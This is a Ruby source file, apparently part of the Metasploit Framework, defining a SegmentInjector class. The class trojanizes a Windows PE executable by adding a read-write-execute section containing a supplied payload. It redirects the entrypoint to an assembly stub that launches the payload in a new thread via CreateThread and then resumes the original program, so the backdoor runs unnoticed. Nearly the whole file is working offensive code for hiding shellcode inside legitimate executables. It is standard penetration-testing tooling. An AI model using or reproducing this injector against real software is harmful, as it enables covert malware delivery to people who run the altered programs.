module Msf
module Exe

  require 'metasm'

  class SegmentInjector

    attr_accessor :payload
    attr_accessor :template
    attr_accessor :arch
    attr_accessor :buffer_register

    def initialize(opts = {})
      @payload = opts[:payload]
      @template = opts[:template]
      @arch  = opts[:arch] || :x86
      @buffer_register = opts[:buffer_register] || 'edx'
      unless %w{eax ecx edx ebx edi esi}.include?(@buffer_register.downcase)
        raise ArgumentError, ":buffer_register is not a real register"
      end
    end

    def processor
      case @arch
      when :x86
        return Metasm::Ia32.new
      when :x64
        return Metasm::X86_64.new
      end
    end

    def create_thread_stub
      <<-EOS
        hook_entrypoint:
        pushad
        push hook_libname
        call [iat_LoadLibraryA]
        push hook_funcname
        push eax
        call [iat_GetProcAddress]
        mov eax, [iat_CreateThread]
        lea edx, [thread_hook]
        push 0
        push 0
        push 0
        push edx
        push 0
        push 0
        call eax

        popad
        jmp entrypoint

        hook_libname db 'kernel32', 0
        hook_funcname db 'CreateThread', 0

        thread_hook:
        lea #{buffer_register}, [thread_hook]
        add #{buffer_register}, 9
      EOS
    end

    def payload_as_asm
      asm = ''
      @payload.each_byte do |byte|
        asm << "db " + sprintf("0x%02x", byte) + "\n"
      end
      return asm
    end

    def payload_stub
      asm = create_thread_stub
      asm << payload_as_asm
      shellcode = Metasm::Shellcode.assemble(processor, asm)
      shellcode.encoded
    end

    def generate_pe
      # Copy our Template into a new PE
      pe_orig = Metasm::PE.decode_file(template)
      pe = pe_orig.mini_copy

      # Copy the headers and exports
      pe.mz.encoded = pe_orig.encoded[0, pe_orig.coff_offset-4]
      pe.mz.encoded.export = pe_orig.encoded[0, 512].export.dup
      pe.header.time = pe_orig.header.time

      # Generate a new code section set to RWX with our payload in it
      s = Metasm::PE::Section.new
      s.name = '.text'
      s.encoded = payload_stub
      s.characteristics = %w[MEM_READ MEM_WRITE MEM_EXECUTE]

      # Tell our section where the original entrypoint was
      s.encoded.fixup!('entrypoint' => pe.optheader.image_base + pe.optheader.entrypoint)
      pe.sections << s
      pe.invalidate_header

      # Change the entrypoint to our new section
      pe.optheader.entrypoint = 'hook_entrypoint'
      pe.cpu = pe_orig.cpu

      pe.encode_string
    end

  end
end
end
